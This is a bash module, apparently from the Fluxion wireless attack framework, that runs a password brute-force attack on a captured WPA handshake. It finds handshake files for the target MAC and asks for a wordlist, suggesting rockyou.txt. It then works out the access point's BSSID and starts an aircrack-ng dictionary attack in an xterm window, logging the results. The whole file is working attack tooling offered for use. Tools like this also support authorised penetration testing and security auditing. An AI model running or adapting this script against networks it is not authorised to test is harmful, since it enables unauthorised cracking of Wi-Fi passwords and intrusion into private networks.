#!/usr/bin/env bash

# ============================================================ #
# ============= < Password Brute Force Parameters > ============= #
# ============================================================ #

PasswordBruteForceState="Not Ready"

# ============================================================ #
# ========= < Password Brute Force Helper Subroutines > ========= #
# ============================================================ #
password_brute_force_header() {
  fluxion_header; fluxion_target_show; echo
}

# ============================================================ #
# ============= < Password Brute Force Subroutines > ============ #
# ============================================================ #
password_brute_force_unset_hash_path() {
  if [ ! "$PasswordBruteForceHashPath" ]; then return 1; fi
  PasswordBruteForceHashPath=""
  
  if [ "$FLUXIONAuto" ]; then return 2; fi
}

password_brute_force_set_hash_path() {
  if [ "$PasswordBruteForceHashPath" ]; then return 0; fi

  password_brute_force_unset_hash_path

  fluxion_header

  echo -e "$FLUXIONVLine $PasswordBruteForceHashPathQuery"
  echo

  fluxion_target_show

  # Check for existing handshakes first
  local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  local defaultHashPath=""
  
  if [ -d "$handshakeDir" ] && [ "$FluxionTargetMAC" ]; then
    local found_hash
    found_hash=$(ls "$handshakeDir"/*"${FluxionTargetMAC^^}".cap 2>/dev/null | head -n1)
    if [ ! "$found_hash" ]; then
      found_hash=$(ls "$handshakeDir"/*"${FluxionTargetMAC,,}".cap 2>/dev/null | head -n1)
    fi
    if [ "$found_hash" ]; then
      defaultHashPath="$found_hash"
    fi
  fi

  if [ "$defaultHashPath" -a -f "$defaultHashPath" -a -s "$defaultHashPath" ]; then
    if [ "$FLUXIONAuto" ]; then
      PasswordBruteForceHashPath=$defaultHashPath
      return 0
    else
      local choices=(
        "$FLUXIONUseFoundHashOption"
        "$FLUXIONSpecifyHashPathOption"
        "$FLUXIONGeneralBackOption"
      )

      fluxion_header

      echo -e "$FLUXIONVLine $FLUXIONFoundHashNotice"
      echo -e "$FLUXIONVLine $FLUXIONUseFoundHashQuery"
      echo

      io_query_choice "" choices[@]

      echo

      case "$IOQueryChoice" in
        "$FLUXIONUseFoundHashOption")
          PasswordBruteForceHashPath=$defaultHashPath
          return 0 ;;
        "$FLUXIONSpecifyHashPathOption")
          ;;
        "$FLUXIONGeneralBackOption")
          return -1 ;;
      esac
    fi
  fi

  while [ ! "$PasswordBruteForceHashPath" ]; do
    fluxion_header

    echo
    echo -e "$FLUXIONVLine $PasswordBruteForceHashPathQuery"
    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileReturnTip"
    echo
    echo -ne "$FLUXIONAbsolutePathInfo: "
    read -e PasswordBruteForceHashPath

    if [ ! "$PasswordBruteForceHashPath" ]; then return 1; fi

    if [ ! -f "$PasswordBruteForceHashPath" -o ! -s "$PasswordBruteForceHashPath" ]; then
      echo -e "$FLUXIONVLine $FLUXIONEmptyOrNonExistentHashError"
      sleep 5
      password_brute_force_unset_hash_path
    fi
  done
}

password_brute_force_unset_dictionary_path() {
  if [ ! "$PasswordBruteForceDictionaryPath" ]; then return 1; fi
  PasswordBruteForceDictionaryPath=""
  
  if [ "$FLUXIONAuto" ]; then return 2; fi
}

password_brute_force_set_dictionary_path() {
  if [ "$PasswordBruteForceDictionaryPath" ]; then return 0; fi

  password_brute_force_unset_dictionary_path

  fluxion_header

  echo -e "$FLUXIONVLine $PasswordBruteForceDictionaryPathQuery"
  echo
  echo -e "$FLUXIONVLine ${CYel}Tip: Common wordlists: /usr/share/wordlists/rockyou.txt, /usr/share/wordlists/passwords/wordlists/rockyou.txt$CClr"
  echo

  fluxion_target_show

  while [ ! "$PasswordBruteForceDictionaryPath" ]; do
    echo
    echo -ne "$FLUXIONAbsolutePathInfo: "
    read -e PasswordBruteForceDictionaryPath

    if [ ! "$PasswordBruteForceDictionaryPath" ]; then return 1; fi

    if [ ! -f "$PasswordBruteForceDictionaryPath" -o ! -s "$PasswordBruteForceDictionaryPath" ]; then
      echo -e "$FLUXIONVLine ${CRed}File does not exist or is empty!$CClr"
      sleep 3
      password_brute_force_unset_dictionary_path
    fi
  done
}

# ============================================================ #
# ===================== < Fluxion Hooks > ==================== #
# ============================================================ #
# This attack doesn't require a targetting interface (works with captured handshake)
attack_targetting_interfaces() {
  # Return empty to skip interface selection
  echo ""
}

unprep_attack() {
  PasswordBruteForceState="Not Ready"

  password_brute_force_unset_dictionary_path
  password_brute_force_unset_hash_path

  return 0
}

prep_attack() {
  IOUtilsHeader="password_brute_force_header"

  local sequence=(
    "set_hash_path"
    "set_dictionary_path"
  )

  if ! fluxion_do_sequence password_brute_force sequence[@]; then
    return 1
  fi

  PasswordBruteForceState="Ready"
}

load_attack() {
  local -r configurationPath=$1

  local configuration
  readarray -t configuration < <(more "$configurationPath")

  PasswordBruteForceHashPath=${configuration[0]}
  PasswordBruteForceDictionaryPath=${configuration[1]}
}

save_attack() {
  local -r configurationPath=$1

  echo "$PasswordBruteForceHashPath" > "$configurationPath"
  echo "$PasswordBruteForceDictionaryPath" >> "$configurationPath"
}

stop_attack() {
  if [ "$PasswordBruteForceCrackerPID" ]; then
    kill -s SIGTERM $PasswordBruteForceCrackerPID &> $FLUXIONOutputDevice
  fi

  PasswordBruteForceCrackerPID=""
  PasswordBruteForceState="Stopped"
}

start_attack() {
  if [ "$PasswordBruteForceState" = "Running" ]; then return 0; fi
  if [ "$PasswordBruteForceState" != "Ready" ]; then return 1; fi
  PasswordBruteForceState="Running"

  fluxion_header

  echo -e "$FLUXIONVLine $PasswordBruteForceStartingNotice"
  echo
  fluxion_target_show
  echo
  echo -e "$FLUXIONVLine Hash file: ${CBlu}$PasswordBruteForceHashPath$CClr"
  echo -e "$FLUXIONVLine Dictionary: ${CBlu}$PasswordBruteForceDictionaryPath$CClr"
  echo

  # Extract BSSID from hash file if available
  local targetBSSID=$FluxionTargetMAC
  if [ ! "$targetBSSID" ] && [ -f "$PasswordBruteForceHashPath" ]; then
    # Try to extract BSSID from filename
    local filename=$(basename "$PasswordBruteForceHashPath")
    if [[ "$filename" =~ ([A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}) ]]; then
      targetBSSID="${BASH_REMATCH[1]}"
    else
      # If no BSSID in filename, try to extract from cap file using airodump-ng
      echo -e "$FLUXIONVLine ${CYel}Extracting BSSID from capture file...$CClr"
      local bssid_line=$(aircrack-ng "$PasswordBruteForceHashPath" 2>/dev/null | grep -E "^[[:space:]]*[0-9]+" | head -n1)
      if [ "$bssid_line" ]; then
        targetBSSID=$(echo "$bssid_line" | awk '{print $2}')
      fi
    fi
  fi

  if [ ! "$targetBSSID" ]; then
    echo -e "$FLUXIONVLine ${CRed}Error: Could not determine BSSID. Please specify target manually.$CClr"
    echo -ne "$FLUXIONVLine Enter BSSID (or press Enter to try without -b flag): "
    read targetBSSID
    if [ -z "$targetBSSID" ]; then
      targetBSSID=""
    fi
  fi

  echo -e "$FLUXIONVLine $PasswordBruteForceCrackingNotice"
  echo

  # Run aircrack-ng in a separate xterm window
  local aircrack_cmd
  if [ "$targetBSSID" ]; then
    aircrack_cmd="aircrack-ng -w \"$PasswordBruteForceDictionaryPath\" -b $targetBSSID \"$PasswordBruteForceHashPath\""
  else
    aircrack_cmd="aircrack-ng -w \"$PasswordBruteForceDictionaryPath\" \"$PasswordBruteForceHashPath\""
  fi
  
  xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCCCC" \
    -title "Password Brute Force - Aircrack-ng" -e \
    "$aircrack_cmd 2>&1 | tee \"$FLUXIONWorkspacePath/bruteforce_output.txt\"; echo; echo -e '${CGrn}Press any key to close...$CClr'; read -n1" &
  
  PasswordBruteForceCrackerPID=$!
  
  echo -e "$FLUXIONVLine ${CGrn}Brute force attack started in new window.$CClr"
  echo -e "$FLUXIONVLine ${CYel}Check the aircrack-ng window for results.$CClr"
  echo
  echo -e "$FLUXIONVLine ${CYel}Press any key to stop the attack...$CClr"
  read -n1
  
  stop_attack
}

# FLUXSCRIPT END

